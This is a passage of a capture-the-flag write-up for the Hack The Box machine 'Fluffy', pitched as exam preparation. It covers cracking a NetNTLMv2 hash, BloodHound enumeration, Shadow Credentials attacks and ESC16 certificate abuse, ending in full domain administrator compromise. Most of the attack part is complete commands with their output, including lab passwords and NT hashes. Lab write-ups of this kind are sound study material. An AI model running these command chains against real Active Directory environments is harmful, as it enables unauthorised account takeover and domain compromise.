Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: P.AGILA::FLUFFY:c4c7fe8d00db2581:7c312353cf713c856f...000000
Time.Started.....: Mon Dec 22 19:43:01 2025 (5 secs)
Time.Estimated...: Mon Dec 22 19:43:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   964.1 kH/s (1.54ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4517888/14344385 (31.50%)
Rejected.........: 0/4517888 (0.00%)
Restore.Point....: 4513792/14344385 (31.47%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: prrprr -> progree
Hardware.Mon.#01.: Util: 35%

Started: Mon Dec 22 19:42:38 2025
Stopped: Mon Dec 22 19:43:07 2025
```

We now have the credentials for p.agila.
```
p.agila:prometheusx-303
```

#### Enumerate as p.agila
As p.agila, we should reenumerate SMB and RPC with enum4linux-ng and NetExec to see if there are new SMB shares we could access. We should also check the `IT` share again to see if there are more folders that we can access. In this case, we discover nothing new.

The host appears to be a Domain Controller with LDAP exposed, making it a good candidate for Active Directory enumeration. We use BloodHound to visualize the domain and identify potential privilege escalation paths.

To collect data, we use RustHound-CE, a Linux-based BloodHound collector that enumerates users, groups, computers, and permissions via LDAP without requiring a Windows foothold. RustHound-CE does not include every check found in SharpHound.exe, as SharpHound runs natively on Windows and can leverage Windows-specific APIs for additional host-level data.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ mkdir bloodhound_info 

┌──(kali㉿kali)-[~/htb/fluffy]
└─$ cd bloodhound_info

┌──(kali㉿kali)-[~/htb/fluffy/bloodhound_info]
└─$ rusthound-ce -c All -d fluffy.htb -u p.agila -p 'prometheusx-303' -i $IP
---------------------------------------------------
Initializing RustHound-CE at 21:59:57 on 12/22/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-12-22T21:59:57Z INFO  rusthound_ce] Verbosity level: Info
[2025-12-22T21:59:57Z INFO  rusthound_ce] Collection method: All
[2025-12-22T21:59:57Z INFO  rusthound_ce::ldap] Connected to FLUFFY.HTB Active Directory!
[2025-12-22T21:59:57Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-12-22T21:59:57Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-12-22T21:59:58Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=fluffy,DC=htb
[2025-12-22T21:59:58Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-12-22T21:59:59Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=fluffy,DC=htb

<SNIP>

RustHound-CE Enumeration Completed at 22:00:01 on 12/22/25! Happy Graphing!
```

We can now load the collected json files into BloodHound. Verify that all files were successfully ingested.
![BloodHound File Ingest](/assets/images/fluffy_file_ingest.png)

In BloodHound, mark p.agila as owned and select the saved cypher query "Shortest paths from Owned objects".
![p.agila Shortest Paths](/assets/images/fluffy_p.agila_shortest_paths.png)

From the BloodHound graph, we can see that p.agila is a member of the Service Account Managers group, which has GenericAll permissions over the Service Accounts group. The Service Accounts group, in turn, has GenericWrite permissions over the service accounts ldap_svc, winrm_svc, and ca_svc.

Because GenericAll grants full control over the Service Accounts group, we can use the p.agila account to modify its membership and add additional users, including p.agila itself, if needed. Once we control membership in the Service Accounts group, we inherit its GenericWrite rights over the three service accounts.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ bloodyAD --host dc01.fluffy.htb -u p.agila -p 'prometheusx-303' -d fluffy.htb add groupMember 'Service Accounts' p.agila 
[+] p.agila added to Service Accounts
```

With GenericWrite permissions over these service account objects, we can perform a Shadow Credentials attack by adding a malicious msDS-KeyCredentialLink attribute to the target account. This allows us to authenticate as the user using certificate-based authentication (PKINIT) and ultimately recover their NTLM hash.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ uv run /opt/pywhisker/pywhisker/pywhisker.py -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' --target 'winrm_svc' --action 'add'
[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 204363cd-025b-79b7-853f-68a8e1e5c1bc
[*] Updating the msDS-KeyCredentialLink attribute of winrm_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 6o60nrFO.pfx
/opt/pywhisker/pywhisker/pywhisker.py:69: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())
[+] PFX exportiert nach: 6o60nrFO.pfx
[i] Passwort für PFX: Eo3Hve0YeIYp54rhYGfY
[+] Saved PFX (#PKCS12) certificate & key at path: 6o60nrFO.pfx
[*] Must be used with password: Eo3Hve0YeIYp54rhYGfY
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

**Note:** If you are getting permission issues, try re-adding p.agila to the group. Hack The Box environments often include cleanup or reset scripts that periodically revert group memberships to their original state. Because of this, even though p.agila has the ability to control membership in the Service Accounts group, we may need to re-add p.agila to the group immediately before executing the Shadow Credentials attack to ensure the necessary permissions are still in place.

After successfully adding the key credential, we use the generated certificate (and the generated password for the certificate) to authenticate as winrm_svc via PKINIT. This allows us to request a Ticket Granting Ticket (TGT) and subsequently retrieve the NTLM hash for the account. I used the certipy tool, but you could also use [PKINITtools](https://github.com/dirkjanm/PKINITtools) or NetExec.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ certipy-ad auth -pfx '6o60nrFO.pfx' -dc-ip $IP -password Eo3Hve0YeIYp54rhYGfY -domain fluffy.htb -username 'winrm_svc'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

/usr/lib/python3/dist-packages/certipy/lib/certificate.py:662: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return pkcs12.load_key_and_certificates(pfx, password)[:-1]
[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767
```

With the NTLM hash for winrm_svc, we can WINRM into the host using the [evil-winrm](https://github.com/Hackplayers/evil-winrm) tool.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ evil-winrm -i fluffy.htb -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'
<SNIP>
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../
*Evil-WinRM* PS C:\Users\winrm_svc> cd Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
```

# root.txt
Returning to the BloodHound graph, we can see that the ca_svc user is a member of the Cert Publishers group. According to Microsoft [documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#cert-publishers), members of this group are permitted “to publish certificates for user objects in Active Directory.” This strongly suggests that the environment is running Active Directory Certificate Services (AD CS) and that the ca_svc account has sufficient privileges to interact with it. Given this, ca_svc is a good candidate for enumerating the certificate services configuration and identifying potentially vulnerable certificate templates.

We begin by repeating the Shadow Credentials attack against the ca_svc account to recover its NTLM hash. Before doing so, we re-add p.agila to the Service Accounts group, as the environment’s cleanup script had reset the group membership and removed the required permissions.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ bloodyAD --host dc01.fluffy.htb -u p.agila -p 'prometheusx-303' -d fluffy.htb add groupMember 'Service Accounts' p.agila          
[+] p.agila added to Service Accounts

┌──(kali㉿kali)-[~/htb/fluffy]
└─$ uv run /opt/pywhisker/pywhisker/pywhisker.py -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' --target 'ca_svc' --action 'add'
[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 17be9476-c03e-b2b0-4a05-060e3c579b0f
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 1O3LKuWu.pfx
/opt/pywhisker/pywhisker/pywhisker.py:69: CryptographyDeprecationWarning: Parsed a serial number which wasnt positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())
[+] PFX exportiert nach: 1O3LKuWu.pfx
[i] Passwort für PFX: xGxcuZcANkxj63tn3BJv
[+] Saved PFX (#PKCS12) certificate & key at path: 1O3LKuWu.pfx
[*] Must be used with password: xGxcuZcANkxj63tn3BJv
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

┌──(kali㉿kali)-[~/htb/fluffy]
└─$ certipy-ad auth -pfx '1O3LKuWu.pfx' -dc-ip $IP -password xGxcuZcANkxj63tn3BJv -domain fluffy.htb -username 'ca_svc'   
Certipy v5.0.4 - by Oliver Lyak (ly4k)

/usr/lib/python3/dist-packages/certipy/lib/certificate.py:662: CryptographyDeprecationWarning: Parsed a serial number which wasnt positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return pkcs12.load_key_and_certificates(pfx, password)[:-1]
[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Got hash for 'ca_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8
```

With the acquired ca_svc credentials, we use Certipy to enumerate AD CS and assess it for common misconfigurations.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ certipy-ad find -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target dc01.fluffy.htb -text -stdout -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: DC01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

I had to run the certipy command twice since it found nothing during the first run. When taking the CPTS, it is a good idea to repeat commands or switch tools to verify that there isn't anything there.

#### ESC16
The scan shows that the host is likely vulnerable to ESC16 because the Security Extension is disabled. Certipy has a nice Privilege Escalation [page](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) that outlines the steps to take for each AD CS abuse scenario (ESC). We can scroll to the ESC16 section and start following the exploitation steps.

1. Read initial UPN of victim user for restoration later. We pick ca_svc as the victim user because we have credentials for the user.

    ```bash
    ┌──(kali㉿kali)-[~/htb/fluffy]
    └─$ certipy-ad account -u 'ca_svc@fluffy.htb' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -user 'ca_svc' read
    Certipy v5.0.4 - by Oliver Lyak (ly4k)

    [*] Reading attributes for 'ca_svc':
        cn                                  : certificate authority service
        distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
        name                                : certificate authority service
        objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
        sAMAccountName                      : ca_svc
        servicePrincipalName                : ADCS/ca.fluffy.htb
        userPrincipalName                   : ca_svc@fluffy.htb
        userAccountControl                  : 66048
        whenCreated                         : 2025-04-17T16:07:50+00:00
        whenChanged                         : 2025-12-23T06:19:00+00:00
    ```
2. Update ca_svc UPN to the target administrator's sAMAccountName.

    ```bash
    ┌──(kali㉿kali)-[~/htb/fluffy]
    └─$ certipy-ad account -u 'ca_svc@fluffy.htb' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -user 'ca_svc' -upn 'administrator' update
    Certipy v5.0.4 - by Oliver Lyak (ly4k)

    [*] Updating user 'ca_svc':
        userPrincipalName                   : administrator
    [*] Successfully updated 'ca_svc'
    ```
3. Verify the UPN was updated.

    ```bash
    ┌──(kali㉿kali)-[~/htb/fluffy]
    └─$ certipy-ad account -u 'ca_svc@fluffy.htb' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -user 'ca_svc' read
    Certipy v5.0.4 - by Oliver Lyak (ly4k)

    [*] Reading attributes for 'ca_svc':
        cn                                  : certificate authority service
        distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
        name                                : certificate authority service
        objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
        sAMAccountName                      : ca_svc
        servicePrincipalName                : ADCS/ca.fluffy.htb
        userPrincipalName                   : administrator
        userAccountControl                  : 66048
        whenCreated                         : 2025-04-17T16:07:50+00:00
        whenChanged                         : 2025-12-23T06:31:06+00:00
    ```
4. If we didn't have credentials for the ca_svc account already, we could gather the credentials with the Shadow Credentials attack using the Certipy tool.

    ```bash
    ┌──(kali㉿kali)-[~/htb/fluffy]
    └─$ certipy-ad shadow -u 'ca_svc@fluffy.htb' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -dc-host dc01.fluffy.htb -account 'ca_svc' auto
    Certipy v5.0.4 - by Oliver Lyak (ly4k)

    [*] Targeting user 'ca_svc'
    [*] Generating certificate
    [*] Certificate generated
    [*] Generating Key Credential
    [*] Key Credential generated with DeviceID 'bd880e41a0b54ae3a593704aba47a2cc'
    [*] Adding Key Credential with device ID 'bd880e41a0b54ae3a593704aba47a2cc' to the Key Credentials for 'ca_svc'
    [*] Successfully added Key Credential with device ID 'bd880e41a0b54ae3a593704aba47a2cc' to the Key Credentials for 'ca_svc'
    [*] Authenticating as 'ca_svc' with the certificate
    [*] Certificate identities:
    [*]     No identities found in this certificate
    [*] Using principal: 'ca_svc@fluffy.htb'
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Saving credential cache to 'ca_svc.ccache'
    File 'ca_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
    [*] Wrote credential cache to 'ca_svc.ccache'
    [*] Trying to retrieve NT hash for 'ca_svc'
    [*] Restoring the old Key Credentials for 'ca_svc'
    [*] Successfully restored the old Key Credentials for 'ca_svc'
    [*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
    ```
5. Request the administrator certificate as ca_svc.

    ```bash
    ┌──(kali㉿kali)-[~/htb/fluffy]
    └─$ certipy-ad req -u 'ca_svc@fluffy.htb' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca 'fluffy-DC01-CA' -dc-ip $IP -dc-host dc01.fluffy.htb -template 'User'
    Certipy v5.0.4 - by Oliver Lyak (ly4k)

    [*] Requesting certificate via RPC
    [*] Request ID is 18
    [*] Successfully requested certificate
    [*] Got certificate with UPN 'administrator'
    [*] Certificate has no object SID
    [*] Try using -sid to set the object SID or see the wiki for more details
    [*] Saving certificate and private key to 'administrator.pfx'
    [*] Wrote certificate and private key to 'administrator.pfx'
    ```
6. Restore ca_svc UPN back to its original state.

    ```bash
    ┌──(kali㉿kali)-[~/htb/fluffy]
    └─$ certipy-ad account -u 'ca_svc@fluffy.htb' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -dc-host dc01.fluffy.htb -upn 'ca_svc' -user 'ca_svc' update
    Certipy v5.0.4 - by Oliver Lyak (ly4k)

    [*] Updating user 'ca_svc':
        userPrincipalName                   : ca_svc
    [*] Successfully updated 'ca_svc'
    ```
7. Retrieve the administrator TGT using the administrator certificate.

    ```bash
    ┌──(kali㉿kali)-[~/htb/fluffy]
    └─$ certipy-ad -debug auth -pfx administrator.pfx -domain fluffy.htb -dc-ip $IP
    Certipy v5.0.4 - by Oliver Lyak (ly4k)

    [+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
    [+] Nameserver: '10.129.232.88'
    [+] DC IP: '10.129.232.88'
    [+] DC Host: ''
    [+] Target IP: '10.129.232.88'
    [+] Remote Name: '10.129.232.88'
    [+] Domain: ''
    [+] Username: ''
    [*] Certificate identities:
    [*]     SAN UPN: 'administrator'
    [*] Using principal: 'administrator@fluffy.htb'
    [*] Trying to get TGT...
    [+] Sending AS-REQ to KDC fluffy.htb (10.129.232.88)
    [*] Got TGT
    [*] Saving credential cache to 'administrator.ccache'
    [+] Attempting to write data to 'administrator.ccache'
    [+] Data written to 'administrator.ccache'
    [*] Wrote credential cache to 'administrator.ccache'
    [*] Trying to retrieve NT hash for 'administrator'
    [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
    ```

With the administrator NTLM, we are able to WINRM onto the host.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ evil-winrm -i fluffy.htb -u administrator -H '8da83a3fa618b6e3a00e93f676c92a6e'
<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fluffy\administrator
```

We now have full compromise of the host and domain.

